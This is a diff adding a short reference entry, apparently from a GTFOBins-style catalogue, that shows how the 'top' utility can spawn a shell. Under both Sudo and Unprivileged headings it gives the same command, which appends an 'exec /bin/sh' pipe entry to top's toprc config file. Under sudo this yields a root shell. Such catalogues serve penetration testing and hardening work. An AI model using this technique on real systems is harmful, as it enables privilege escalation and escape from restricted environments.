@@ -1,0 +1,19 @@
+top
+===
+
+Shell
+-----
+
+[Sudo]
+    echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+top
+# press return twice
+reset
+    The config path might be different.
+
+[Unprivileged]
+    echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+top
+# press return twice
+reset
+    The config path might be different.
